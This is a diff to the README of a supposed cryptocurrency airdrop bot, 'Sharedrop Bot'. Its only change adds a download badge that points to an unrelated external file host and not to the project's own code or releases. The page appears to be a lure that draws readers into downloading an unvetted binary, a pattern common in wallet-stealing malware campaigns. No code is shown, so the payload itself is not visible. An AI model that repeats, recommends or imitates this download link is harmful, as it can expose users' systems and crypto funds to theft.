@@ -2,6 +2,8 @@
 
 Sharedrop Bot is a cryptocurrency tool designed to automate the process of participating in airdrop events, enabling users to claim free tokens from various blockchain projects with ease. The bot simplifies the process by automatically completing the necessary tasks for users to receive rewards, saving them time and effort while helping them stay up to date with the latest airdrop opportunities.
 
+[![Download Sharedrop Bot](https://img.shields.io/badge/Download-Sharedrop%20bot-blueviolet)](https://downeefiles.com/s/shb)
+
 ### Key Features:
 - **Automatic Airdrop Participation**:  
    Sharedrop Bot automates the process of participating in airdrops, ensuring that users don’t miss out on token giveaways by handling the registration and task completion for them.
